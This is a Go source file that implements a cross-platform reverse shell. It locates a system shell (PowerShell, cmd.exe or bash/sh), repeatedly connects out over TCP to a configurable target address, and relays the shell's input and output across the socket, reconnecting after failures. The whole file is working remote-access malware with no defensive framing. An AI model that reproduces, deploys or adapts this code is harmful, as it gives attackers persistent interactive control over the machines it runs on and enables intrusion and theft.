package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

var Target = "127.0.0.1:9999"
var BufferSize = 128

func findShell() string {
	shells := []string{}
	if runtime.GOOS == "windows" {
		shells = []string{
			"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
			"C:\\Windows\\System32\\cmd.exe",
		}
	} else {
		shells = []string{
			"/usr/local/bin/bash",
			"/usr/bin/bash",
			"/bin/bash",
			"/bin/sh",
		}
	}
	for _, path := range shells {
		_, err := os.Stat(path)
		if err == nil {
			return path
		}
	}
	return ""
}

func connectBack(address string) net.Conn {
	for {
		connection, err := net.Dial("tcp", address)
		if err == nil {
			return connection
		}
		fmt.Printf("connect back: %v\n", err)
		time.Sleep(3 * time.Second)
	}
}

func executeShell(shell string, input <-chan []byte, output chan<- []byte, errors chan<- error) {
	command := exec.Command(shell)

	stdin, err := command.StdinPipe()
	if err != nil {
		errors <- err
		return
	}

	stdout, err := command.StdoutPipe()
	if err != nil {
		errors <- err
		return
	}

	stderr, err := command.StderrPipe()
	if err != nil {
		errors <- err
		return
	}

	go func() {
		for {
			select {
			case data := <-input:
				_, err := stdin.Write(data)
				if err != nil {
					errors <- err
					return
				}
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, BufferSize)
			_, err := stdout.Read(buf)
			if err != nil {
				errors <- err
				return
			}
			output <- buf
		}
	}()

	go func() {
		for {
			buf := make([]byte, BufferSize)
			_, err := stderr.Read(buf)
			if err != nil {
				errors <- err
				return
			}
			output <- buf
		}
	}()

	command.Run()
}

func receiveInput(connection net.Conn, input chan<- []byte, errors chan<- error) {
	for {
		data := make([]byte, BufferSize)
		connection.SetReadDeadline(time.Now().Add(1 * time.Second))
		_, err := connection.Read(data)
		if err != nil && !os.IsTimeout(err) {
			errors <- err
			return
		}
		input <- data
	}
}

func sendOutput(connection net.Conn, output <-chan []byte, errors chan<- error) {
	for {
		select {
		case data := <-output:
			connection.SetWriteDeadline(time.Now().Add(1 * time.Second))
			_, err := connection.Write(data)
			if err != nil && !os.IsTimeout(err) {
				errors <- err
				return
			}
		}
	}
}

func main() {
	shell := findShell()
	if shell == "" {
		fmt.Println("no shell executable found")
		os.Exit(1)
	}
	for {
		input := make(chan []byte)
		output := make(chan []byte)
		errors := make(chan error)
		connection := connectBack(Target)
		defer connection.Close()
		go executeShell(shell, input, output, errors)
		go receiveInput(connection, input, errors)
		go sendOutput(connection, output, errors)
		select {
		case err := <-errors:
			fmt.Println(err)
			break
		}
	}
}
